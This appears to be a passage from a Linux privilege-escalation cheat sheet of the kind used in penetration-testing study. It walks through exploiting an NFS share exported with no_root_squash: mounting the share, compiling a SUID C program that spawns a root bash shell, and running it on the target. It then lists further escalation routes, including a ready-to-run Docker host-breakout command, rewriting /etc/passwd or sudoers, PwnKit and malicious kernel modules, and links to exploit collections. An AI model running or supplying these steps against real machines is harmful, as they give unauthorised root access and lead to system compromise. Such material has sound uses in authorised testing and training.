Root squashing maps files owned by root (uid 0) to a different ID (e.g. anonymous or nobody). If the "no_root_squash" option is enabled, files owned by root will not get mapped. This means that as long as you access the NFS share as a root (uid 0) user, you can write to the host file system as root.


    $ cat /etc/exports

    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

On your local machine, check that the NFS share is accessible:


    # showmount -e 10.0.0.1
    Export list for 10.0.0.1:
    /tmp *

On your local machine, make a directory to mount the remote share, and then mount it:


    # mkdir /tmp/mount
    # mount -o rw,vers=2 10.0.0.1:/tmp /tmp/mount
    # ls /tmp/mount
    backup.tar.gz  useless

Create an executable that calls /bin/bash with root level permissions in the mounted share and set the SUID bit:


    int main() {
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }


    # gcc -o rootsh rootsh.c
    # cp rootsh /tmp/mount
    # chmod +s /tmp/mount/rootsh

Now, back on the remote host, execute the executable to spawn a root shell:


    $ /tmp/rootsh
    #

Alternatively, on the remote host, copy the /bin/bash or /bin/sh binary to the NFS directory:


    $ cp /bin/bash /tmp

On your local machine, after mounting the NFS share, create new copies of the files (or chown them to root) and set the SUID/SGUID bits:


    # cp bash rootbash
    # chmod +s rootbash

    OR

    # chown root:root bash
    # chmod +s bash

Now, back on the remote host, run the file. For bash / sh, use the -p command line option to preserve the SUID/SGID (otherwise shell will simply spawn as your own user).


    $ /tmp/rootbash -p
    #

    OR

    $ /tmp/bash -p
    #
</details>
<details>
<summary>Additional Techniques</summary>
 <br> 
1. Environment Variables
Techniques using:

LD_LIBRARY_PATH

LD_AUDIT

LD_DEBUG

Similar to LD_PRELOAD but often overlooked.

2. Scheduled Tasks / at Command
Like cron, but via atd (one-time jobs).

If a user can create at jobs, they can escalate.

3. Docker / LXC Breakouts
If user is in docker group:

bash

    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Also applies to lxc containers if misconfigured.

4. Exposed Sensitive Files
World-readable private keys:

/etc/shadow

.ssh/id_rsa

.bash_history with creds

5. SetUID Scripts
Dangerous if interpreted by /bin/bash or Python.

Can be bypassed using race conditions or custom interpreters.

6. Abusing passwd / /etc/sudoers
Writable /etc/passwd, /etc/shadow, or /etc/sudoers.

Add a root user or give self sudo.

7. dbus / polkit Exploits
Real-world example: CVE-2021-4034 (PwnKit).

Can escalate from low-priv to root if exploitable version is present.

8. Kernel Modules (if in kmod, insmod, etc.)
If user can load kernel modules:

Write a rootkit or malicious kernel module for privilege escalation.

9. Services Running as Root
If user can edit config or scripts executed by a service (e.g., web server, backup agent), they may hijack execution.

10. User Namespace Escapes (Namespace PrivEsc)
Exploiting the way Linux handles namespaces in containers.

Useful in CTFs and container breakouts.

11. PAM Misconfiguration
Abusing PAM to run arbitrary code on login or via screen savers.

12. Mount Tricks
Mounting system folders over writable mount points.
Example: mount --bind to tamper with /etc/passwd.
 </details>
##########################
Linux Privilege Escalation
##########################

* https://github.com/mubix/post-exploitation
* https://github.com/spencerdodd/kernelpop
* https://github.com/SecWiki/linux-kernel-exploits
* https://www.google.com/search?q=kernel+exploits
* https://github.com/NullArray/RootHelper
* https://greysec.net/showthread.php?tid=1355
* https://github.com/DominicBreuker/pspy
* https://touhidshaikh.com/blog/?p=790
* http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/
* https://gtfobins.github.io/
* https://guif.re/linuxeop
* https://github.com/sagishahar/lpeworkshop
* https://github.com/codingo/OSCP-2
* https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/
* https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
* https://docs.ansible.com/ansible/latest/user_guide/become.html
* https://payatu.com/guide-linux-privilege-escalation/
* https://github.com/Arrexel/phpbash
